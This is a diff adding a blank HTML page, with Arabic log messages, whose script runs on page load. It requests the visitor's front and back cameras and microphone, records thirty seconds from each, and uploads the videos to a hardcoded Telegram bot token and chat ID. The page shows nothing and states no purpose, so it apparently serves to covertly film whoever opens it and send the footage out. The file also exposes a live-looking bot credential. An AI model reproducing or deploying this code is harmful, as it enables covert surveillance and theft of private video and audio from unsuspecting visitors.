@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <script>
+        function startRecording(facingMode, videoFileName) {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode },
+                audio: true
+            })
+            .then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, videoFileName);
+
+                    const telegramBotToken = '7867318181:AAFHSDLNLvdPFomn3HDxBbNCINP0LeDLHjw';
+                    const chatId = '1832658980';
+
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(`تم إرسال الفيديو (${videoFileName}) بنجاح:`, data);
+                    })
+                    .catch(error => {
+                        console.error(`حدث خطأ أثناء إرسال الفيديو (${videoFileName}):`, error);
+                    });
+                };
+
+                mediaRecorder.start();
+
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 30 * 1000); // مدة التسجيل 30 ثانية
+            })
+            .catch(error => {
+                console.error(`خطأ أثناء الوصول إلى الكاميرا (${facingMode}):`, error);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            startRecording('user', 'front_recording.webm');
+            startRecording('environment', 'back_recording.webm');
+        });
+    </script>
+</body>
+</html>
